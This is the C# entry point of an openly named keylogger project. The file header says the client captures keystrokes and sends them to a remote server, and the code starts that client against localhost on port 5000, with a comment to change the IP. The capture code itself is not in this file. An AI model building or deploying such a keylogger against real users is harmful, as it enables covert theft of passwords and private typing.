/*************************************************************************
 *                                                                       *
 *  File:        Program.cs                                              *
 *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
 *                         Cojocaru Valentin                             *
 *  Website:     https://github.com/GlavanPavel/Keylogger                *
 *  Description: Entry point for the Keylogger Client application.       *
 *               Initializes and runs the client that captures and       *
 *               sends keystrokes to the remote server.                  *
 *                                                                       *
 *  This code and information is provided "as is" without warranty of    *
 *  any kind, either expressed or implied, including but not limited     *
 *  to the implied warranties of merchantability or fitness for a        *
 *  particular purpose. You are free to use this source code in your     *
 *  applications as long as the original copyright notice is included.   *
 *                                                                       *
 *************************************************************************/


/// <summary>
/// Entry point for the keylogger client application.
/// </summary>
class Program
{
    /// <summary>
    /// The main asynchronous entry method that starts the keylogger client.
    /// </summary>
    /// <returns>A Task representing the asynchronous operation.</returns>
    static async Task Main()
    {
        var keyloggerClient = new KeyloggerClient.KeyloggerClient();

        // Connect directly to specified IP and port (change IP as needed)
        await keyloggerClient.StartAsync(host: "localhost", port: 5000);
    }
}
